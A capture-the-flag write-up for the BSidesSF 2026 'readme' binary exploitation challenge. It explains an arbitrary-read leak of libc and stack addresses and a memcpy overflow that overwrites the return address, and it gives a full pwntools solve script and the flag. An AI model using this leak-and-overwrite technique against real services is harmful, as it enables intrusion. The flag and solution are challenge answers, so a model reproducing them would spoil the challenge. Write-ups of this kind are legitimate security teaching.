# readme — PWN

**CTF**: BSidesSF 2026
**Flag**: `CTF{this-got-difficult-quick-eh}`

---

## TL;DR

Arbitrary memory read + `memcpy` stack buffer overflow. No PIE, no canary. Leak libc and stack via `r`, then `h` command's `memcpy` overflows the return address with `secret_function` address (embedded in fgets length input at a calculated offset).

---

## Binary

```
readme: ELF 64-bit LSB executable, x86-64, not stripped
RELRO: Partial | Canary: No | NX: Yes | PIE: No (0x400000)
```

### Commands
| Cmd | Action |
|-----|--------|
| `r` | `write(stdout, ptr, len)` — arbitrary memory read |
| `h` | `memcpy(rbp-0x120, ptr, len)` + hex print — read + **stack overflow** |
| `w` | disabled |

### `secret_function` (0x40148c)
Opens `flag.txt`, reads and prints it, then calls `exit(0)`.

### Stack layout
```
rbp-0x180: length input (fgets #3)
rbp-0x160: offset input (fgets #2)
rbp-0x140: command input (fgets #1)
rbp-0x120: s1 buffer (memcpy destination)
rbp+0x08:  return address ← target (0x128 bytes from s1)
```

---

## Exploit

### 1. Leak libc + stack

```python
# puts@GOT → libc base
r → read 8 bytes from 0x404008

# __environ → stack pointer → main's rbp
r → read __environ
main_rbp = environ - 0x128   # verified: *(rbp+8) is libc code
```

### 2. Overflow via memcpy

The three `fgets` calls run BEFORE `memcpy`. Our input is already on the stack.

Set `ptr = rbp - 0x2A0` so that `ptr + 0x128 = rbp - 0x178 = length_input[8]`.

Length input: `"130\x00\x00\x00\x00\x00" + p64(0x40148c)`
- strtol parses `"130"` = 0x130 (enough to overflow ret)
- `p64(0x40148c)` at byte 8 → lands at `s1[0x128]` = return address

### 3. Trigger

Close stdin → loop exits → `main` returns → `secret_function` → flag.

---

## Solve Script

```python
from pwn import *
context.arch = 'amd64'

io = remote('readme-02de52b5.challenges.bsidessf.net', 4446)
io.recvuntil(b'GO\n')

io.sendline(b'r'); io.sendline(b'404008'); io.sendline(b'8')
libc_base = u64(io.recvn(8)) - ELF('libc.so.6',checksec=0).symbols['puts']

ea = libc_base + ELF('libc.so.6',checksec=0).symbols['__environ']
io.sendline(b'r'); io.sendline(hex(ea)[2:].encode()); io.sendline(b'8')
rbp = u64(io.recvn(8)) - 0x128

io.sendline(b'h')
io.sendline(hex(rbp - 0x2A0)[2:].encode())
io.sendline(b"130\x00\x00\x00\x00\x00" + p64(0x40148c))
io.recvn(0x130*2, timeout=10)

io.shutdown('send')
print(io.recvall(timeout=5).decode())
```

## Flag

```
CTF{this-got-difficult-quick-eh}
```
